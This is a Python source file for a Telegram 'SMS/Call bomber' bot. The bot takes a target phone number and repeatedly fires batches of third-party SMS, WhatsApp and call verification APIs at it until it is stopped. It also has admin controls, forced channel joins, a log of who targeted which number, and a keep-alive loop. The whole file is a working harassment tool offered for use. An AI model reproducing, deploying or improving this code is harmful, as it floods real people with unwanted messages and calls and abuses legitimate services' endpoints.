# main.py
# Complete Telegram Bomber Bot with Self-Pinging System
# Professional + Friendly Frontend
# Supports 127 APIs (114 SMS/WhatsApp + 13 Call)

import os
import logging
import asyncio
import json
import io
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
from database import (
    init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
    get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
    get_user_target, set_admin_role, get_user_count, get_all_user_ids,
    get_user_phone, add_protected_number, remove_protected_number, is_protected, get_all_protected_numbers
)
from config import (
    BOT_TOKEN, OWNER_ID, PORT, WEBHOOK_URL, BATCH_SIZE, SMS_INTERVAL, CALL_INTERVAL,
    MAX_REQUEST_LIMIT, TELEGRAM_RATE_LIMIT_SECONDS, NORMAL_USER_AUTO_STOP_SECONDS,
    LOG_CHANNEL_ID, FORCE_CHANNELS, BRANDING, SMS_WHATSAPP_APIS, CALL_APIS
)
import aiohttp

# ==================== LOGGING ====================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONSTANTS ====================
# Split SMS/WhatsApp APIs into batches
sms_batches = [SMS_WHATSAPP_APIS[i:i+BATCH_SIZE] for i in range(0, len(SMS_WHATSAPP_APIS), BATCH_SIZE)]

# Active bombing sessions
bombing_active = {}          # user_id -> asyncio.Event
user_intervals = {}          # not used in batch mode, kept for compatibility
user_start_time = {}
request_counts = {}

# States for conversation
STATE_NONE = 0
STATE_AWAITING_PHONE = 1
STATE_AWAITING_CONFIRM = 2
STATE_AWAITING_ADMIN_BAN = 3
STATE_AWAITING_ADMIN_UNBAN = 4
STATE_AWAITING_ADMIN_DELETE = 5
STATE_AWAITING_ADMIN_BROADCAST = 6
STATE_AWAITING_ADMIN_DM = 7
STATE_AWAITING_ADMIN_DM_TEXT = 8
STATE_AWAITING_ADMIN_ADDADMIN = 9
STATE_AWAITING_ADMIN_REMOVEADMIN = 10
STATE_AWAITING_ADMIN_LOOKUP = 11
STATE_AWAITING_ADMIN_PROTECT = 12
STATE_AWAITING_ADMIN_UNPROTECT = 13

# ==================== HELPER FUNCTIONS ====================
async def call_api(session, api, phone):
    """Call a single API asynchronously"""
    try:
        url = api["url"].format(phone=phone) if "{phone}" in api["url"] else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        data = None
        if api.get("data_template") and api["method"] == "POST":
            data_str = api["data_template"].format(phone=phone)
            if "application/json" in headers.get("Content-Type", ""):
                data = json.loads(data_str)
            else:
                data = data_str
        if api["method"] == "POST":
            async with session.post(url, headers=headers, json=data if isinstance(data, dict) else None, data=data if isinstance(data, str) else None, timeout=5) as resp:
                return resp.status in [200, 201, 202]
        else:
            async with session.get(url, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202]
    except Exception:
        return False

async def send_log(user_id, target, context):
    """Send bombing start log to channel"""
    try:
        user = await context.bot.get_chat(user_id)
        username = user.username or "no_username"
        first_name = user.first_name or "No name"
        text = (
            f"🚨 <b>Bomber Started</b>\n"
            f"👤 User: <a href='tg://user?id={user_id}'>{first_name}</a> (@{username})\n"
            f"📱 Target: <code>{target}</code>\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=text, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Failed to send log: {e}")

async def update_status_message(context, user_id, status_msg, phone, stats):
    """Update bombing status message"""
    try:
        elapsed = int(time.time() - stats['start_time'])
        text = (
            f"🔥 <b>🔥 BOMBER ACTIVE 🔥</b>\n\n"
            f"📱 <b>Target:</b> <code>{phone}</code>\n"
            f"⏱️ <b>Elapsed:</b> {elapsed} seconds\n"
            f"📨 <b>SMS/WhatsApp Hits:</b> {stats['sms_whatsapp_hits']}\n"
            f"📞 <b>Call Hits:</b> {stats['call_hits']}\n"
            f"💥 <b>Total Hits:</b> {stats['total_hits']}\n"
            f"⚙️ <b>Batch Size:</b> {BATCH_SIZE}\n"
            f"🕒 <b>Intervals:</b> SMS {SMS_INTERVAL}s | Call {CALL_INTERVAL}s\n\n"
            f"🛑 Press Stop when you want to finish."
        )
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing")]]))
    except Exception:
        pass

async def sms_whatsapp_bomber(session, phone, stop_flag, stats, status_msg, context, user_id):
    """Send SMS/WhatsApp APIs in batches"""
    batch_idx = 0
    while not stop_flag.is_set():
        batch = sms_batches[batch_idx % len(sms_batches)]
        tasks = [call_api(session, api, phone) for api in batch]
        results = await asyncio.gather(*tasks)
        success = sum(results)
        stats['sms_whatsapp_hits'] += success
        stats['total_hits'] += success
        if int(time.time() - stats['last_update']) >= TELEGRAM_RATE_LIMIT_SECONDS:
            stats['last_update'] = time.time()
            await update_status_message(context, user_id, status_msg, phone, stats)
        batch_idx += 1
        # Wait for interval with stop flag check
        for _ in range(SMS_INTERVAL):
            if stop_flag.is_set():
                break
            await asyncio.sleep(1)

async def call_bomber(session, phone, stop_flag, stats, status_msg, context, user_id):
    """Send Call APIs one by one"""
    call_idx = 0
    while not stop_flag.is_set():
        api = CALL_APIS[call_idx % len(CALL_APIS)]
        success = await call_api(session, api, phone)
        if success:
            stats['call_hits'] += 1
            stats['total_hits'] += 1
        call_idx += 1
        if int(time.time() - stats['last_update']) >= TELEGRAM_RATE_LIMIT_SECONDS:
            stats['last_update'] = time.time()
            await update_status_message(context, user_id, status_msg, phone, stats)
        # Wait for interval
        for _ in range(CALL_INTERVAL):
            if stop_flag.is_set():
                break
            await asyncio.sleep(1)

async def perform_bombing_task(user_id, phone, context):
    """Main bombing task"""
    stop_flag = asyncio.Event()
    bombing_active[user_id] = stop_flag
    stats = {
        'sms_whatsapp_hits': 0,
        'call_hits': 0,
        'total_hits': 0,
        'start_time': time.time(),
        'last_update': time.time()
    }
    await send_log(user_id, phone, context)
    status_msg = await context.bot.send_message(
        chat_id=user_id,
        text=f"🔥 <b>Bomber Initializing...</b>\n\nTarget: <code>{phone}</code>\nPlease wait...",
        parse_mode=ParseMode.HTML
    )
    async with aiohttp.ClientSession() as session:
        sms_task = asyncio.create_task(sms_whatsapp_bomber(session, phone, stop_flag, stats, status_msg, context, user_id))
        call_task = asyncio.create_task(call_bomber(session, phone, stop_flag, stats, status_msg, context, user_id))
        try:
            await asyncio.gather(sms_task, call_task)
        except asyncio.CancelledError:
            pass
        finally:
            sms_task.cancel()
            call_task.cancel()
            await asyncio.gather(sms_task, call_task, return_exceptions=True)
    final_text = (
        f"✅ <b>Bomber Finished</b>\n\n"
        f"📱 Target: <code>{phone}</code>\n"
        f"📨 SMS/WhatsApp Hits: {stats['sms_whatsapp_hits']}\n"
        f"📞 Call Hits: {stats['call_hits']}\n"
        f"💥 Total Hits: {stats['total_hits']}\n"
        f"{BRANDING}"
    )
    await status_msg.edit_text(final_text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 MAIN MENU", callback_data="main_menu")]]))
    bombing_active.pop(user_id, None)

# ==================== FORCE CHANNELS ====================
async def get_missing_channels(user_id, context):
    missing = []
    for ch in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                missing.append(ch)
        except:
            missing.append(ch)
    return missing

async def send_force_channel_prompt(query, context, missing):
    keyboard = [[InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["link"])] for ch in missing]
    keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_force_channels")])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="main_menu")])
    await query.edit_message_text(
        "⚠️ <b>Access Restricted</b>\n\n"
        "You must join the following channels to use this bot:\n" +
        "\n".join([f"• {ch['name']}" for ch in missing]) +
        "\n\nAfter joining, click the button below.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ==================== MAIN MENU & ADMIN PANEL ====================
def get_main_menu(user_id):
    keyboard = [
        [InlineKeyboardButton("💣 START BOMBER", callback_data="bomb_start")],
        [InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing")],
        [InlineKeyboardButton("📋 MAIN MENU", callback_data="main_menu")]
    ]
    if is_admin(user_id) or user_id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

async def show_admin_panel_to_user(target, user_id):
    keyboard = [
        [InlineKeyboardButton("👥 List Users", callback_data="admin_list_users"), InlineKeyboardButton("🕒 Recent Users", callback_data="admin_recent_users")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("📨 Direct Message", callback_data="admin_dm")],
        [InlineKeyboardButton("🔍 User Lookup", callback_data="admin_lookup"), InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
        [InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"), InlineKeyboardButton("🗑 Delete User", callback_data="admin_delete")],
        [InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin"), InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin")],
        [InlineKeyboardButton("🛡️ Protect Number", callback_data="admin_protect"), InlineKeyboardButton("🛡️ Unprotect Number", callback_data="admin_unprotect")],
        [InlineKeyboardButton("📜 List Protected", callback_data="admin_list_protected"), InlineKeyboardButton("💾 Backup", callback_data="admin_backup")],
    ]
    if user_id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("💾 Full Backup (Owner)", callback_data="admin_fullbackup")])
    keyboard.append([InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")])
    text = "👑 <b>Admin Control Panel</b>\nSelect an action:"
    if hasattr(target, 'edit_message_text'):
        await target.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

# ==================== CALLBACK HANDLER ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "main_menu":
        await query.edit_message_text(
            "📋 <b>Main Menu</b>\n\nWelcome! Use the buttons below to control the bomber.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_main_menu(user_id)
        )
        context.user_data.clear()

    elif data == "bomb_start":
        context.user_data['state'] = STATE_AWAITING_PHONE
        await query.edit_message_text(
            "📱 <b>Enter Target Number</b>\n\nPlease send the 10-digit phone number (without country code).\nExample: <code>9876543210</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]])
        )

    elif data == "stop_bombing":
        if user_id in bombing_active:
            bombing_active[user_id].set()
            await query.edit_message_text("🛑 Stop signal sent. Bomber will stop shortly.", reply_markup=get_main_menu(user_id))
        else:
            await query.edit_message_text("ℹ️ No active bomber session found.", reply_markup=get_main_menu(user_id))

    elif data == "admin_panel":
        if is_admin(user_id) or user_id == OWNER_ID:
            await show_admin_panel_to_user(query, user_id)
        else:
            await query.edit_message_text("⛔ Unauthorized access.", reply_markup=get_main_menu(user_id))

    elif data == "check_force_channels":
        missing = await get_missing_channels(user_id, context)
        if missing:
            await send_force_channel_prompt(query, context, missing)
        else:
            phone = context.user_data.get('phone')
            if phone:
                if not (is_admin(user_id) or user_id == OWNER_ID) and is_protected(phone):
                    await query.edit_message_text("⚠️ This number is protected and cannot be bombed.", reply_markup=get_main_menu(user_id))
                    return
                asyncio.create_task(perform_bombing_task(user_id, phone, context))
                await query.edit_message_text("✅ Bomber started! You'll receive status updates.", reply_markup=get_main_menu(user_id))
                context.user_data.clear()
            else:
                await query.edit_message_text("✅ All channels joined. Use /start to bomb.", reply_markup=get_main_menu(user_id))

    elif data == "confirm_bomb":
        phone = context.user_data.get('phone')
        if not phone:
            await query.edit_message_text("❌ Error: No number found. Please start again.", reply_markup=get_main_menu(user_id))
            return
        if not (is_admin(user_id) or user_id == OWNER_ID) and is_protected(phone):
            await query.edit_message_text("⚠️ This number is protected and cannot be bombed.", reply_markup=get_main_menu(user_id))
            return
        missing = await get_missing_channels(user_id, context)
        if missing and not (is_admin(user_id) or user_id == OWNER_ID):
            context.user_data['phone'] = phone
            await send_force_channel_prompt(query, context, missing)
            return
        asyncio.create_task(perform_bombing_task(user_id, phone, context))
        await query.edit_message_text("✅ Bomber started! You'll receive status updates.", reply_markup=get_main_menu(user_id))
        context.user_data.clear()

    # -------------------- ADMIN ACTIONS (PAGINATED) --------------------
    elif data.startswith("admin_list_users") or data.startswith("list_users_page:"):
        page = int(data.split(":")[1]) if ":" in data else 0
        per_page = 10
        users = get_all_users_paginated(page, per_page)
        if not users and page > 0:
            page = 0
            users = get_all_users_paginated(page, per_page)
        if not users:
            await query.edit_message_text("No users found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
            return
        text = f"👥 <b>Users - Page {page+1}</b>\n\n" + "\n".join([f"• <code>{u['user_id']}</code> | @{u['username'] or 'no_username'}" for u in users])
        keyboard = []
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"list_users_page:{page-1}"))
        if len(users) == per_page:
            nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
        if nav:
            keyboard.append(nav)
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("admin_recent_users") or data.startswith("recent_users_page:"):
        page = int(data.split(":")[1]) if ":" in data else 0
        per_page = 10
        users = get_recent_users_paginated(page, per_page)
        if not users and page > 0:
            page = 0
            users = get_recent_users_paginated(page, per_page)
        if not users:
            await query.edit_message_text("No recent users.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
            return
        text = f"🕒 <b>Recent Users (Last 7 days) - Page {page+1}</b>\n\n" + "\n".join([f"• <code>{u['user_id']}</code> | @{u['username'] or 'no_username'} | Joined: {u['joined_at']}" for u in users])
        keyboard = []
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"recent_users_page:{page-1}"))
        if len(users) == per_page:
            nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
        if nav:
            keyboard.append(nav)
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "admin_backup":
        users = get_all_users_paginated(0, 10000)
        data_json = [dict(u) for u in users]
        backup_json = json.dumps(data_json, default=str, indent=2)
        file = io.BytesIO(backup_json.encode())
        file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name, caption="📁 User backup.")
        await query.edit_message_text("Backup sent.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    elif data == "admin_fullbackup" and user_id == OWNER_ID:
        users = get_all_users_paginated(0, 10000)
        data_json = [dict(u) for u in users]
        backup_json = json.dumps(data_json, default=str, indent=2)
        file = io.BytesIO(backup_json.encode())
        file.name = f"fullbackup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name, caption="📁 Full backup (Owner).")
        await query.edit_message_text("Full backup sent.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    elif data == "admin_list_protected" or data.startswith("protected_page:"):
        page = 0
        if data.startswith("protected_page:"):
            page = int(data.split(":")[1])
        per_page = 15
        all_nums = get_all_protected_numbers()
        total = len(all_nums)
        start = page * per_page
        end = start + per_page
        page_nums = all_nums[start:end]
        if not page_nums and page > 0:
            page = 0
            page_nums = all_nums[:per_page]
        if not page_nums:
            await query.edit_message_text("No protected numbers.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
            return
        text = f"🛡️ <b>Protected Numbers</b> (Page {page+1})\n\n" + "\n".join([f"• <code>{num}</code>" for num in page_nums])
        keyboard = []
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"protected_page:{page-1}"))
        if end < total:
            nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"protected_page:{page+1}"))
        if nav:
            keyboard.append(nav)
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

    # Actions that require text input
    elif data == "admin_ban":
        context.user_data['state'] = STATE_AWAITING_ADMIN_BAN
        await query.edit_message_text("🚫 Send the user ID to ban.\nExample: <code>123456789</code>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_unban":
        context.user_data['state'] = STATE_AWAITING_ADMIN_UNBAN
        await query.edit_message_text("🔓 Send the user ID to unban.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_delete":
        context.user_data['state'] = STATE_AWAITING_ADMIN_DELETE
        await query.edit_message_text("🗑️ Send the user ID to delete permanently.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_lookup":
        context.user_data['state'] = STATE_AWAITING_ADMIN_LOOKUP
        await query.edit_message_text("🔍 Send the user ID to look up.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_addadmin":
        context.user_data['state'] = STATE_AWAITING_ADMIN_ADDADMIN
        await query.edit_message_text("➕ Send the user ID to promote to admin.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_removeadmin":
        context.user_data['state'] = STATE_AWAITING_ADMIN_REMOVEADMIN
        await query.edit_message_text("➖ Send the user ID to demote from admin.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_protect":
        context.user_data['state'] = STATE_AWAITING_ADMIN_PROTECT
        await query.edit_message_text("🛡️ Send the phone number to protect (10 digits).\nExample: <code>9876543210</code>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_unprotect":
        context.user_data['state'] = STATE_AWAITING_ADMIN_UNPROTECT
        await query.edit_message_text("🛡️ Send the phone number to remove protection.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_broadcast":
        context.user_data['state'] = STATE_AWAITING_ADMIN_BROADCAST
        await query.edit_message_text("📢 Send the broadcast message (text) or reply to a message to forward.\nTo cancel: /cancel", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_dm":
        context.user_data['state'] = STATE_AWAITING_ADMIN_DM
        await query.edit_message_text("📨 Send the user ID to DM.", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))

    else:
        await query.edit_message_text("Unknown command.", reply_markup=get_main_menu(user_id))

# ==================== TEXT INPUT HANDLER ====================
async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = context.user_data.get('state', STATE_NONE)
    text = update.message.text.strip()

    # Cancel command
    if text.lower() == "/cancel":
        context.user_data.clear()
        await update.message.reply_text("❌ Operation cancelled.", reply_markup=get_main_menu(user_id))
        return

    if state == STATE_AWAITING_PHONE:
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) not in [10, 11, 12]:
            await update.message.reply_text("⚠️ Invalid number. Please enter a 10-digit number (e.g., 9876543210).", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]))
            return
        # Self-bomb check
        user_phone = get_user_phone(user_id)
        if user_phone and user_phone == phone:
            await update.message.reply_text("⚠️ You cannot bomb your own number for security reasons.", reply_markup=get_main_menu(user_id))
            return
        context.user_data['phone'] = phone
        context.user_data['state'] = STATE_AWAITING_CONFIRM
        await update.message.reply_text(
            f"📱 <b>Target Number:</b> <code>{phone}</code>\n\n"
            "Do you want to start the bomber?",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ YES, START", callback_data="confirm_bomb")],
                [InlineKeyboardButton("❌ NO, CANCEL", callback_data="main_menu")]
            ])
        )
        return

    # Admin actions
    elif state == STATE_AWAITING_ADMIN_BAN:
        try:
            target = int(text)
            if ban_user(target):
                await update.message.reply_text(f"✅ User <code>{target}</code> has been banned.", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ User not found.")
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_UNBAN:
        try:
            target = int(text)
            if unban_user(target):
                await update.message.reply_text(f"✅ User <code>{target}</code> has been unbanned.", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ User not found or not banned.")
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_DELETE:
        try:
            target = int(text)
            if delete_user(target):
                await update.message.reply_text(f"✅ User <code>{target}</code> has been deleted.", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ User not found.")
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_LOOKUP:
        try:
            uid = int(text)
            user = get_user_by_id(uid)
            if not user:
                await update.message.reply_text("❌ User not found.")
            else:
                target_num = get_user_target(uid) or "None"
                msg = (
                    f"👤 <b>User Details</b>\n"
                    f"ID: <code>{uid}</code>\n"
                    f"Username: @{user['username'] or 'no_username'}\n"
                    f"Name: {user['first_name'] or 'N/A'}\n"
                    f"Role: {user['role']}\n"
                    f"Banned: {'Yes' if user['banned'] else 'No'}\n"
                    f"Last target: {target_num}"
                )
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_ADDADMIN:
        try:
            uid = int(text)
            set_admin_role(uid, True)
            await update.message.reply_text(f"✅ User <code>{uid}</code> is now admin.", parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_REMOVEADMIN:
        try:
            uid = int(text)
            set_admin_role(uid, False)
            await update.message.reply_text(f"✅ User <code>{uid}</code> is no longer admin.", parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_PROTECT:
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) not in [10, 11, 12]:
            await update.message.reply_text("❌ Invalid number. Must be 10-12 digits.")
        else:
            if add_protected_number(phone, user_id):
                await update.message.reply_text(f"✅ Number <code>{phone}</code> is now protected.", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("⚠️ Number already protected.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_UNPROTECT:
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) not in [10, 11, 12]:
            await update.message.reply_text("❌ Invalid number.")
        else:
            if remove_protected_number(phone):
                await update.message.reply_text(f"✅ Protection removed for <code>{phone}</code>.", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("⚠️ Number not protected.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_BROADCAST:
        # Simple broadcast without progress for simplicity (can be enhanced)
        users = get_all_user_ids()
        success = 0
        for uid in users:
            try:
                if update.message.reply_to_message:
                    await context.bot.copy_message(chat_id=uid, from_chat_id=update.effective_chat.id, message_id=update.message.reply_to_message.message_id)
                else:
                    await context.bot.send_message(chat_id=uid, text=text)
                success += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await update.message.reply_text(f"📢 Broadcast sent to {success}/{len(users)} users.")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_DM:
        try:
            target = int(text)
            context.user_data['dm_target'] = target
            context.user_data['state'] = STATE_AWAITING_ADMIN_DM_TEXT
            await update.message.reply_text("📨 Now send the message (text or reply to a message).", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
        except:
            await update.message.reply_text("❌ Invalid user ID.")
            await show_admin_panel_to_user(update.message, user_id)
            context.user_data.clear()

    elif state == STATE_AWAITING_ADMIN_DM_TEXT:
        target = context.user_data.get('dm_target')
        if not target:
            await update.message.reply_text("❌ Error. Try again.")
            await show_admin_panel_to_user(update.message, user_id)
            context.user_data.clear()
            return
        try:
            if update.message.reply_to_message:
                await context.bot.copy_message(chat_id=target, from_chat_id=update.effective_chat.id, message_id=update.message.reply_to_message.message_id)
            else:
                await context.bot.send_message(chat_id=target, text=text)
            await update.message.reply_text(f"✅ Message sent to <code>{target}</code>.", parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed: {e}")
        await show_admin_panel_to_user(update.message, user_id)
        context.user_data.clear()

    else:
        await update.message.reply_text(
            "🤖 Please use the menu buttons to interact.",
            reply_markup=get_main_menu(user_id)
        )

# ==================== START COMMAND ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name)
    welcome_text = (
        f"✨ <b>Welcome {user.first_name}!</b> ✨\n\n"
        f"I am a <b>powerful SMS/Call bomber bot</b> with over <b>127+ working APIs</b>.\n\n"
        f"🔹 <b>Features:</b>\n"
        f"   • 114 SMS/WhatsApp APIs\n"
        f"   • 13 Call APIs\n"
        f"   • Batch processing (55 per batch)\n"
        f"   • Admin panel with full control\n\n"
        f"📌 Use the buttons below to get started.\n"
        f"{BRANDING}"
    )
    await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML, reply_markup=get_main_menu(user.id))

# ==================== ADMIN COMMAND ====================
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id) or user_id == OWNER_ID:
        await show_admin_panel_to_user(update.message, user_id)
    else:
        await update.message.reply_text("⛔ You are not authorized to use this command.", reply_markup=get_main_menu(user_id))

# ==================== SELF-PING SYSTEM (KEEP ALIVE) ====================
async def self_ping_loop():
    """Periodically ping the webhook URL to prevent Render from sleeping"""
    while True:
        await asyncio.sleep(10 * 60)  # 10 minutes
        try:
            async with aiohttp.ClientSession() as session:
                await session.get(WEBHOOK_URL)
                logger.info("Self-ping sent to keep alive")
        except Exception as e:
            logger.error(f"Self-ping failed: {e}")

# ==================== MAIN ====================
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    app.add_handler(CallbackQueryHandler(button_callback))

    # Start self-ping loop in background
    loop = asyncio.get_event_loop()
    loop.create_task(self_ping_loop())

    # Start webhook or polling
    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Starting webhook on {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.warning("WEBHOOK_URL not set, falling back to polling")
        app.run_polling()

if __name__ == "__main__":
    main()
